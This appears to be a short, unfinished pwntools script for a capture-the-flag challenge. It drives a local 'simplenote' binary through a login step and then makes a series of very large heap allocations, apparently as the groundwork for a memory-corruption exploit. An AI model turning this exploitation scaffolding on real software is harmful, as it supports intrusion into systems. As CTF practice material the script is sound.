#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *

context.log_level = "debug"
p = process("./subler ./simplenote.bin ./flag", shell=True)

p.recvuntil("> ")

p.sendline("123456789")

p.recvuntil(": ")

p.sendline("say2\n12345")

p.recvuntil("> ")

#now loop to hell!

def alloc(size, content):

    p.sendline("1")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("content:\n")
    p.sendline(content)
    p.recvuntil("> ")

#try to allocate a big one.

alloc(20971520-0x23f4, "saybig")
alloc(2097152, "saybig2")

for i in range(1):

    alloc(131072, "say" + str(i))

p.interactive()
